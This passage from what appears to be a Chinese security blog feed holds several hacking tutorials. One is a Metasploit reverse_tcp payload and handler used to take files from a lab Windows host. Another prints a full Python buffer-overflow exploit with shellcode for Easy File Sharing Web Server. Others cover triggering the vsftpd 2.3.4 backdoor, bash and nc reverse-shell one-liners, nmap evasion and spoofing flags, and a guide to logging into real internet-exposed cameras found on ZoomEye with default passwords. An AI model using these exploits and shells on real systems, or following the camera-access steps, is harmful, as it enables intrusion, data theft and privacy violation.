        <content type="html"><![CDATA[<h1 id="Metasploit的简单应用"><a href="#Metasploit的简单应用" class="headerlink" title="Metasploit的简单应用"></a>Metasploit的简单应用</h1><p>1、生成主控端、被控端。<br>2、获得靶机(Windows)控制权。<br>3、下载靶机上任意一个文件。</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>靶机： 关闭了windows安全中心的win10，ip: 192.168.118.132</p><p>攻击机：kali ip:192.168.118.128</p><h2 id="开搞"><a href="#开搞" class="headerlink" title="开搞"></a>开搞</h2><p>生成被控端</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.118.128 LPORT=5000 -f exe &gt; /root/payload.exe#LHOST=kali的ip#LPORT=端口</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211106175332973.png" alt="image-20211106175332973"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211106175426563.png" alt="image-20211106175426563"></p><p>将生成的payload.exe丢进靶机里面</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211106180904411.png" alt="image-20211106180904411"></p><p>回到kali</p><p>运行msfconsole</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211106181253626.png" alt="image-20211106181253626"></p><p>执行以下命令</p><pre><code>use exploit/multi/handlerset payload windows/meterpreter/reverse_tcp</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211106185237839.png" alt="image-20211106185237839"></p><p>执行 show options查看配置</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211106185450806.png" alt="image-20211106185450806"></p><p>发现LHOST和LPORT还没设置</p><p>执行</p><pre><code>set lhost 192.168.118.128set lport 5000</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211106190234370.png" alt="image-20211106190234370"></p><p>LHOST和LPORT已经重新设置</p><p>然后执行</p><pre><code>exploit</code></pre><p>等待对方上线</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211106190753464.png" alt="image-20211106190753464"></p><p>双击靶机的payload.exe就可以看到kali中出现了一个session，也就是会话，这表示从现在起，我们可以通过被控制端程序来控制目标计算机了。同时，我们可以看到上图中出现meterpreter，这就是一个被控程序，meterpreter是运行在内存中的，通过注入dll文件实现，在目标计算机的硬盘上不会留下文件痕迹，所以在被入侵时很难找到。输入ls就可以查看payload.exe文件所在的当前目录有哪些文件</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211106191133783.png" alt="image-20211106191133783"></p><p>我在靶机桌面上放了个flag.txt</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211106192310207.png" alt="image-20211106192310207"></p><p>回到kali执行ls查看文件</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211106191512514.png" alt="image-20211106191512514"></p><p>把它下载下来</p><pre><code>download flag.txt</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211106191953885.png" alt="image-20211106191953885"></p><p>得到flag</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211106192133806.png" alt="image-20211106192133806"></p><p>搞定收工</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>easy file sharing server漏洞复现</title>
      <link href="/2021/11/03/easy-file-sharing-server%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2021/11/03/easy-file-sharing-server%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="easy-file-sharing-server漏洞复现"><a href="#easy-file-sharing-server漏洞复现" class="headerlink" title="easy file sharing server漏洞复现"></a>easy file sharing server漏洞复现</h1><h2 id="一、漏洞详情"><a href="#一、漏洞详情" class="headerlink" title="一、漏洞详情"></a>一、漏洞详情</h2><p>Easy File Sharing FTP Server是一款FTP服务程序。 Easy File Sharing FTP Server处理PASS命令存在问题，远程攻击者可以利用漏洞进行缓冲区溢出攻击，可能以进程权限执行任意指令。 提交超长字符串作为PASS命令参数，可导致触发缓冲区溢出，精心构建提交数据可能以进程权限执行任意指令。</p><h2 id="二、工具"><a href="#二、工具" class="headerlink" title="二、工具"></a>二、工具</h2><p>靶机： 192.168.118.132、win10（可用其他win系统，把windows安全中心关闭）、安装easy file sharing server</p><p>攻击机：192.168.118.128、kali</p><h2 id="三、开始复现"><a href="#三、开始复现" class="headerlink" title="三、开始复现"></a>三、开始复现</h2><p>靶机打开easy file sharing server，把端口改为8000，然后点击restart</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211103203726819.png"></p><p>在kali用nmap扫描</p><pre><code>nmap -sV 192.168.118.0/24  </code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211103204514315.png" alt="image-20211103204514315"></p><p>可以发现主机192.168.118.132（靶机）已经在8000端口打开了Easy File Sharing 服务</p><p>在kali使用searchsploit工具查找相应的渗透模块</p><p><a href="https://blog.csdn.net/qq_38243607/article/details/107140817">传送门</a></p><pre><code>searchsploit easy file sharing</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211103211503587.png" alt="image-20211103211503587"></p><p>图片中path的，就是示例脚本的路径，完整路径是：&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;+path中的脚本路径</p><p>这里使用39009.py</p><pre><code>python /usr/share/exploitdb/exploits/windows/remote/39009.py 192.168.118.132 8000</code></pre><p>复现成功</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211103213100870.png"></p><p>脚本代码</p><pre><code class="python"># Exploit Title: Easy File Sharing Web Server 7.2 - HEAD HTTP request SEH Buffer Overflow# Date: 12/2/2015# Exploit Author: ArminCyber# Contact: Armin.Exploit@gmail.com# Version: 7.2# Tested on: XP SP3 EN# category: Remote Exploit# Usage: ./exploit.py ip portimport socketimport syshost = str(sys.argv[1])port = int(sys.argv[2])a = socket.socket()print &quot;Connecting to: &quot; + host + &quot;:&quot; + str(port)a.connect((host,port))entire=4500# Junkbuff = &quot;A&quot;*4061# Next SEHbuff+= &quot;\xeb\x0A\x90\x90&quot;# pop pop retbuff+= &quot;\x98\x97\x01\x10&quot;buff+= &quot;\x90&quot;*19# calc.exe# Bad Characters: \x20 \x2f \x5cshellcode = (&quot;\xd9\xcb\xbe\xb9\x23\x67\x31\xd9\x74\x24\xf4\x5a\x29\xc9&quot;&quot;\xb1\x13\x31\x72\x19\x83\xc2\x04\x03\x72\x15\x5b\xd6\x56&quot;&quot;\xe3\xc9\x71\xfa\x62\x81\xe2\x75\x82\x0b\xb3\xe1\xc0\xd9&quot;&quot;\x0b\x61\xa0\x11\xe7\x03\x41\x84\x7c\xdb\xd2\xa8\x9a\x97&quot;&quot;\xba\x68\x10\xfb\x5b\xe8\xad\x70\x7b\x28\xb3\x86\x08\x64&quot;&quot;\xac\x52\x0e\x8d\xdd\x2d\x3c\x3c\xa0\xfc\xbc\x82\x23\xa8&quot;&quot;\xd7\x94\x6e\x23\xd9\xe3\x05\xd4\x05\xf2\x1b\xe9\x09\x5a&quot;&quot;\x1c\x39\xbd&quot;)buff+= shellcodebuff+= &quot;\x90&quot;*7buff+= &quot;A&quot;*(4500-4061-4-4-20-len(shellcode)-20)# HEADa.send(&quot;HEAD &quot; + buff + &quot; HTTP/1.0\r\n\r\n&quot;)a.close()print &quot;Done...&quot;</code></pre><h2 id="另一种“姿势”"><a href="#另一种“姿势”" class="headerlink" title="另一种“姿势”"></a>另一种“姿势”</h2><p>利用Metasploit生成主控端和被动端</p><p>在kali输入</p><pre><code>msfconsole</code></pre><p>开启msf控制台</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211104122617692.png" alt="image-20211104122617692"></p><p>寻找EasyFileSharing漏洞利用模块</p><pre><code>search EasyFileSharing</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211104122911066.png" alt="image-20211104122911066"></p><p>然后</p><pre><code>use exploit/windows/http/easyfilesharing_seh</code></pre><p>提示No payload configured, defaulting to windows&#x2F;meterpreter&#x2F;reverse_tcp</p><pre><code>show options//查看配置</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211104123311810.png" alt="image-20211104123311810"></p><pre><code>set rhost 192.168.118.132</code></pre><p>输入 </p><pre><code>exploit</code></pre><p>模块执行成功，然后你就可以执行任意你想要执行的命令</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211104131046111.png" alt="image-20211104131046111"></p><p>在靶机写个字符串保存在flag.txt里，放在C:\EFS Software\Easy File Sharing Web Server下，用于后续辨别</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211104131150479.png" alt="image-20211104131150479"></p><p>执行命令ls，可以找到刚刚在靶机写的flag.txt</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211104131253395.png" alt="image-20211104131253395"></p><p>把它下载下来</p><pre><code>download flag.txt</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211104131438019.png" alt="image-20211104131438019"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211104131554985.png" alt="image-20211104131554985"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞复现(vsftpd 2.3.4)</title>
      <link href="/2021/11/01/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-vsftpd-2-3-4/"/>
      <url>/2021/11/01/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-vsftpd-2-3-4/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞复现-vsftpd-2-3-4"><a href="#漏洞复现-vsftpd-2-3-4" class="headerlink" title="漏洞复现(vsftpd 2.3.4)"></a>漏洞复现(vsftpd 2.3.4)</h1><h2 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h2><p>攻击机：kali: 192.168.118.128</p><p>靶机：Metasplotable2-Linux: 192.168.118.131</p><h2 id="开始复现"><a href="#开始复现" class="headerlink" title="开始复现"></a>开始复现</h2><p>打开kali终端，执行以下命令</p><pre><code>nmap 192.168.118.0/24</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-11-01%20165841.png" alt="屏幕截图 2021-11-01 165841"></p><p>发现靶机(192.168.118.131)打开着21端口 </p><pre><code>nmap -sV 192.168.118.131</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211101170431983.png" alt="image-20211101170431983"></p><p>这里可以看到靶机的ftp服务的版本信息是vsftpd 2.3.4，漏洞就在这里</p><pre><code>ftp 192.168.118.131 21</code></pre><pre><code>用户名 root:)//&#39;:)&#39;是触发条件密码： sssss //密码可乱来</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211101172804027.png" alt="image-20211101172804027"></p><p>执行以上命令后发现靶机打开了6200端口，这就是个后门</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211101172714302.png" alt="image-20211101172714302"></p><p>然后直接连接这个端口</p><pre><code>nc 192.168.118.131 6200</code></pre><p>成功连接,后门建立了shell，可以开始执行命令</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211101173201531.png" alt="image-20211101173201531"></p><p>复现结束</p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zoomeye抓取摄像头</title>
      <link href="/2021/10/25/zoomeye%E6%8A%93%E5%8F%96%E6%91%84%E5%83%8F%E5%A4%B4/"/>
      <url>/2021/10/25/zoomeye%E6%8A%93%E5%8F%96%E6%91%84%E5%83%8F%E5%A4%B4/</url>
      
        <content type="html"><![CDATA[<h1 id="zoomeye抓取摄像头"><a href="#zoomeye抓取摄像头" class="headerlink" title="zoomeye抓取摄像头"></a>zoomeye抓取摄像头</h1><h2 id="一、"><a href="#一、" class="headerlink" title="一、"></a>一、</h2><p>打开zoomeye，在搜索框搜索搜索关键词“JAWS”</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-10-25%20212442.png"></p><h2 id="二、"><a href="#二、" class="headerlink" title="二、"></a>二、</h2><p>寻找摄像头，点击图中所画的圈内的黑点进入</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/Inked%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-10-25%20203524_LI.jpg"></p><p>尝试弱口令（默认口令）</p><p>用户名：admin</p><p>密码：空</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-10-25%20213227.png"></p><p>接下来就是一个个尝试了</p><h2 id="三、"><a href="#三、" class="headerlink" title="三、"></a>三、</h2><p>登录成功后，若出现以下情况，就点击“here”下载安装flash</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-10-25%20203420.png"></p><p>下载并安装成功后，将url复制到flash的搜索框内，点击搜索</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/Inked%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-10-25%20203934_LI.jpg"></p><p>然后就能看到摄像头的画面了</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/Inked%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-10-25%20204036_LI.jpg"></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NMAP的基本使用</title>
      <link href="/2021/10/18/nmap%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
      <url>/2021/10/18/nmap%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="NMAP的基本使用"><a href="#NMAP的基本使用" class="headerlink" title="NMAP的基本使用"></a>NMAP的基本使用</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​nmap是一个网络探测和安全扫描程序，系统管理者和个人可以使用这个软件扫描大型的网络，获取那台主机正在运行以及提供什么服务等信息。nmap支持很多扫描技术</p><h2 id="初次使用"><a href="#初次使用" class="headerlink" title="初次使用"></a>初次使用</h2><p>（这里使用kali自带的作为演示）</p><p>首先我们要知道这工具该怎么用，</p><p>在kali打开终端，输入如下命令，可以知道有哪些命令</p><pre><code>nmap -h</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-10-18%20171852.png"></p><h2 id="最基本的命令"><a href="#最基本的命令" class="headerlink" title="最基本的命令"></a>最基本的命令</h2><pre><code>nmap ip（域名）//可以扫描出其对外开放的服务</code></pre><p>如</p><pre><code>nmap www.baidu.comnmap xxx.xxx.xxx.xxx</code></pre><h2 id="端口扫描常用参数"><a href="#端口扫描常用参数" class="headerlink" title="端口扫描常用参数"></a>端口扫描常用参数</h2><ol><li>-sT<br> TCP connect()扫描：这是最基本的TCP扫描方式。connect()是一种系统调用，由操作系统提供，用来打开一个连接。如果目标端口有程序监听，connect()就会成功返回，否则这个端口是不可达的。</li><li>-sS<br>　TCP同步扫描(TCP  SYN)：因为不必全部打开一个TCP连接，所以这项技术通常称为半开扫描(half-open)。你可以发出一个TCP同步包(SYN)，然后等待回应。如果对方返回SYN|ACK(响应)包就表示目标端口正在监听；如果返回RST数据包，就表示目标端口没有监听程序；如果收到一个SYN|ACK包，源主机就会马上发出一个RST(复位)数据包断开和目标主机的连接，这实际上有我们的操作系统内核自动完成的。这项技术最大的好处是，很少有系统能够把这记入系统日志。不过，你需要root权限来定制SYN数据包。</li><li>-sP<br> ping扫描：有时你只是想知道此时网络上哪些主机正在运行。通过向你指定的网络内的每个IP地址发送ICMP echo请求数据包，nmap就可以完成这项任务。如果主机正在运行就会作出响应。</li><li>-sU<br> UDP扫描：如果你想知道在某台主机上提供哪些UDP(用户数据报协议,RFC768)服务，可以使用这种扫描方法。nmap首先向目标主机的每个端口发出一个0字节的UDP包，如果我们收到端口不可达的ICMP消息，端口就是关闭的，否则我们就假设它是打开的。</li><li>-R<br>  RPC扫描。这种方法和nmap的其它不同的端口扫描方法结合使用。选择所有处于打开状态的端口向它们发出SunRPC程序的NULL命令，以确定它们是否是RPC端口，如果是，就确定是哪种软件及其版本号。因此你能够获得防火墙的一些信息。诱饵扫描现在还不能和RPC扫描结合使用。</li><li>-v<br> 冗余模式。强烈推荐使用这个选项，它会给出扫描过程中的详细信息。使用这个选项，你可以得到事半功倍的效果。使用-d选项可以得到更加详细的信息。</li><li>-O<br>  这个选项激活对TCP&#x2F;IP指纹特征(fingerprinting)的扫描，获得远程主机的标志。换句话说，nmap使用一些技术检测目标主机操作系统网络协议栈的特征。nmap使用这些信息建立远程主机的指纹特征，把它和已知的操作系统指纹特征数据库做比较，就可以知道目标主机操作系统的类型。</li><li>-p 指定扫描端口  nmap -p 80,445 192.168.21.1    nmap -p 1-1000 192.168.21.1</li><li>-F 快速扫描常用端口  nmap -F 192.168.21.1</li><li>-r 使用该选项不会对端口进行随机的顺序扫描</li><li>–top-ports  扫描开发概率最高的1000个TCP端口  nmap –top-ports 1000 192.168.21.1  nmap –top-ports 100 192.168.21.1</li></ol><h2 id="端口状态"><a href="#端口状态" class="headerlink" title="端口状态"></a>端口状态</h2><p>1.Open，端口开启，有程序监听此端口</p><p>2.Closed，端口关闭，数据能到达主机，但是没有程序监听此端口。<br>3.Filtered，数据未能到达主机。<br>4.Unfiltered，数据能到达主机，但是Nmap无法判断端口开启还是关闭。<br>5.Open|filtered，端口没有返回值，主要出现在UDP，IP，FIN，NULL和Xmas扫描<br>6.Closed|filtered，只出现在IP ID idle 扫描。</p><h4 id="时序选项"><a href="#时序选项" class="headerlink" title="时序选项:"></a>时序选项:</h4><p>在Nmap中使用-T (0-5)可以启用时序选项，对于时序选项这里有0~5不同的选项。</p><p>IDS:入侵检测系统</p><p>-T0 (偏执的):非常慢的扫描，用于IDS逃避。<br>-T1 (鬼祟的):缓慢的扫描，用于IDS逃避。<br>-T2 (文雅的):降低速度以降低对带宽的消耗，此选项- -般不常用。<br>-T3 (普通的):默认，根据目标的反应自动调整时间。<br>-T4 (野蛮的):快速扫描，常用扫描方式，需要在很好的网络环境下进行扫描，请求可能会淹没目标。<br>-T5 (疯狂的):极速扫描，这种扫描方式以牺牲准确度来提升扫描速度。</p><p>(现在一般用-T4)</p><pre><code>nmap -T4 192.168.21.1</code></pre><h2 id="主机发现常用命令"><a href="#主机发现常用命令" class="headerlink" title="主机发现常用命令"></a>主机发现常用命令</h2><p>nmap -A baidu.com:全面扫描</p><p>nmap 127.0.0.1-200:扫描一个C段</p><p>nmap baidu.com :进行一个快速的扫描</p><p>Ping扫描:</p><pre><code>只进行ping,然后显示出在线的主机主机发现:nmap -sP 192.168.126.131/24</code></pre><p>无Ping扫描:</p><pre><code>常用于防火墙禁止ping的情况下nmap -P0 192.168.121.32可以手动设置扫描的协议：    TCP:对应协议编号为6。    ICMP:对应协议编号为1    IGMP:对应协议编号为2    UDP:对应协议编号为17用TCP,UDP,IGMP协议向目标主机发包判断是否存活;    nmap -p06,17,2 192.168.121.1/24   (默认用的为1,2,4)</code></pre><p>TCP SYN扫描</p><pre><code>nmap -PS -v 192.168.21.1通常情况下Nmap 默认ping扫描是使用TCP ACK和ICMP Echo请求对目标进行扫描.目标主机的防火墙阻止这些请求时,可以用TCP SYN Ping扫描进行对目标主机存活的判断指定端口范围进行的扫描nmap -PS80,100-200 -v 192.168.21.1TCP ACK Ping扫描    使用-PA选项可以进行TCP ACK Ping扫描，它与TCP SYN Ping扫描是非常类似的，唯一的区别是设置TCP的标志位是ACK而不是SYN,使用这种方式扫描可以探测阻止:SYN包或ICMP Echo请求的主机。很多防火墙会封锁SYN报文,所以Nmap提供了TCP SYN Ping扫描与TCP ACK Ping扫描两种探测方式，这两种方式可以极大地提高通过防火墙的概率，我们还可以同时使用-PS与-PA来既发送SYN又发送ACK。在使用TCP ACK Ping扫描时，Nmap 会发送一一个ACK标志的TCP包给目标主机，如果目标主机不是存活状态则不响应该请求，如果目标主机在线则会返回一个RST包。    nmap -PA 192.168.21.1    nmap -PA -PS -v 192.168.21.1两种一起用UDP Ping 扫描    nmap -PU 192.168.21.1ARP Ping 扫描    通常在扫描局域网时使用,内网使用ARP Ping扫描方式是最有效的    nmap 默认情况下扫描局域网内的主机会使用ARP扫描,即使指定了-PS等    nmap -PR 192.168.21.1-200列表扫描 -sL 不知道有啥用禁止反向域名解析 -n    该选项很少使用，如果是对–台有域名绑定的服务器通常不会使用该选项;    如果是单纯扫描一-段IP， 使用该选项可以大幅度减少目标主机的相应时间，从而更快地得到结果。反向域名解析    -R选项意为反向解析城名，使用该选项时Nmap永远对目标IP地址作反向域名解析。    该选项多用于绑定域名的服务器主机上,该选项的使用便于我们了解目标的详细信息。例如，在扫描一个C段的时候，我们更加清楚在哪- - 段IP上存在哪些网站。扫描IPV6    nmap -6 fe80::1c98:68e:303d:496aIPv6将会逐渐替换IPv4,但在一段相当长的时间内，IPv4 还会大量地存在。后面章节演示的IP则都是IPv4地址，如果需要扫描IPv6地址，则需要在每个语句的IPv6目标地址前面加上-6选项。–traceroute 路由跟踪    nmap --traceroute -v baidu.com</code></pre><h2 id="防火墙-x2F-IDS-入侵检测-逃逸"><a href="#防火墙-x2F-IDS-入侵检测-逃逸" class="headerlink" title="防火墙&#x2F;IDS(入侵检测)逃逸"></a>防火墙&#x2F;IDS(入侵检测)逃逸</h2><p>报文分段</p><pre><code>nmap -sV -F 192.168.1.100</code></pre><p>IP欺骗 -D</p><pre><code>RND 随机生成:nmap -D RND:11 192.168.21.1指定IP:nmap -D 192.168.1.1,192.168.1.2,192.168.1.3 192.168.21.1</code></pre><p>源地址欺骗-sI</p><pre><code>nmap -sI www. 0day.co:80 192.168.126.131</code></pre><p>源端口欺骗</p><pre><code>nmap --source-port 53 182.168.21.1</code></pre><p>MAC地址欺骗</p><pre><code>spoof-mac 0会随机生成一个nmap -sT -PN --spoof-mac 0 192.168.126.131</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>linux反弹shell</title>
      <link href="/2021/10/16/linux%E5%8F%8D%E5%BC%B9shell/"/>
      <url>/2021/10/16/linux%E5%8F%8D%E5%BC%B9shell/</url>
      
        <content type="html"><![CDATA[<h1 id="linux反弹shell"><a href="#linux反弹shell" class="headerlink" title="linux反弹shell"></a>linux反弹shell</h1><p>客户机：ubuntu</p><p>ip: 192.168.118.130</p><p>攻击机：kali  </p><p>ip:192.168.118.128</p><h2 id="1-bash反弹"><a href="#1-bash反弹" class="headerlink" title="1.bash反弹"></a>1.bash反弹</h2><p>攻击机执行命令：</p><pre><code>nc -lvp 8888</code></pre><p><img src="https://i.loli.net/2021/10/09/STNBcU6bdr9XwW5.png"></p><p>客户机执行命令：</p><pre><code>bash -i &gt;&amp; /dev/tcp/192.168.118.128/8888 0&gt;&amp;1</code></pre><p><img src="https://i.loli.net/2021/10/09/Sd84UwZfyoCgt7L.png"></p><p>然后攻击机这边成功拿到shell</p><p><img src="https://i.loli.net/2021/10/09/EegIW67x9sPRu8A.png"></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><pre><code>bash -i &gt;&amp; /dev/tcp/远程ip/port 0&gt;&amp;1</code></pre><p>bash是&#x2F;bin&#x2F;目录下的二进制程序</p><p>&#x2F;dev&#x2F;tcp是Linux中的一个特殊设备，打开这个文件相当于发出了一个socket调用，建立一个socket连接。</p><p>0&gt;&amp;:  当&gt;&amp;后面接文件时，表示将标准输出和标准错误输出重定向至文件。</p><p>0&gt;&amp;1: 在命令后面加上0&gt;&amp;1,表示将标准输入重定向到标准输出，这里的标准输出已经重定向到了&#x2F;dev&#x2F;tcp&#x2F;远程ip&#x2F;port这个文件，也就是远程，那么标准输入也重定向到了远程</p><pre><code>nc -lvp port</code></pre><p>nc 全称为netcat，所做的就是在两台电脑之间建立链接，并返回两个数据流。</p><p>-g&lt;网关&gt; 设置路由器跃程通信网关，最多可设置8个。<br>-G&lt;指向器数目&gt; 设置来源路由指向器，其数值为4的倍数。<br>-h 在线帮助。<br>-i&lt;延迟秒数&gt; 设置时间间隔，以便传送信息及扫描通信端口。<br>-l 使用监听模式，管控传入的资料。<br>-n 直接使用IP地址，而不通过域名服务器。<br>-o&lt;输出文件&gt; 指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。<br>-p&lt;通信端口&gt; 设置本地主机使用的通信端口。<br>-r 乱数指定本地与远端主机的通信端口。<br>-s&lt;来源位址&gt; 设置本地主机送出数据包的IP地址。<br>-u 使用UDP传输协议。<br>-v 显示指令执行过程。详细信息<br>-w&lt;超时秒数&gt; 设置等待连线的时间。<br>-z 使用0输入&#x2F;输出模式，只在扫描通信端口时使用。</p><p>其他版本</p><p>攻击机：</p><pre><code>nc -lvp 3434</code></pre><pre><code>客户机：exec 5&lt;&gt;/dev/tcp/192.168.118.128/3434cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</code></pre><p><img src="https://raw.githubusercontent.com/todis21/todis21.github.io/master/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-10-13%20222957.png"></p><p><img src="https://raw.githubusercontent.com/todis21/todis21.github.io/master/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-10-13%20223016.png"></p><h2 id="2-nc交互式反弹"><a href="#2-nc交互式反弹" class="headerlink" title="2.nc交互式反弹"></a>2.nc交互式反弹</h2><p>攻击机</p><pre><code>nc -lvp 8888nc -lvvp 8888</code></pre><p><img src="https://i.loli.net/2021/10/09/nM47yYBSRo2UmNX.png"></p><p>客户机;</p><pre><code> /bin/sh | nc 192.168.118.128 8888</code></pre><p>连接后，在攻击机输入的字符回车后会在客户机呈现</p><p><img src="https://i.loli.net/2021/10/09/BzpsmjTncC6oQre.png"></p><p><img src="https://i.loli.net/2021/10/09/xIK14h8bEkUDs9i.png"></p><p><a href="https://xz.aliyun.com/t/2548">参考文章1</a></p><p><a href="https://xz.aliyun.com/t/2549">参考文章2</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Wireshark分析ping的数据包</title>
      <link href="/2021/10/11/Wireshark%E5%88%86%E6%9E%90ping%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/"/>
      <url>/2021/10/11/Wireshark%E5%88%86%E6%9E%90ping%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<h1 id="Wireshark分析ping的数据包"><a href="#Wireshark分析ping的数据包" class="headerlink" title="Wireshark分析ping的数据包"></a>Wireshark分析ping的数据包</h1><h2 id="1-抓取ping数据包"><a href="#1-抓取ping数据包" class="headerlink" title="1.抓取ping数据包"></a>1.抓取ping数据包</h2><p>打开Wireshark  开启抓包，打开cmd输入ping github.com 回车</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-10-18%20133742.png"></p><p>在Wireshark的中条件过滤栏输入“icmp”</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-10-18%20133907.png"></p><p>可以看到8个报文，其中有4个请求报文和4个应答报文</p><h2 id="2-分析其中一个报文（request）"><a href="#2-分析其中一个报文（request）" class="headerlink" title="2.分析其中一个报文（request）"></a>2.分析其中一个报文（request）</h2><h3 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h3><p>可以看到ping request数据链路层报文一共有74个字节，帧序号为258，使用的协议为icmp协议</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-10-18%20134012.png"></p><h3 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h3><p>这里有发送数据帧的源节点MAC地址和接收数据帧的目标节点MAC地址</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-10-18%20134135.png"></p><h3 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h3><p>这里包含着发送数据帧的源节点IP地址和接收数据帧的目标节点IP地址</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-10-18%20134222.png"></p><h3 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h3><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-10-18%20134331.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hitcon_2017_ssrfme</title>
      <link href="/2021/10/06/hitcon-2017-ssrfme/"/>
      <url>/2021/10/06/hitcon-2017-ssrfme/</url>
      
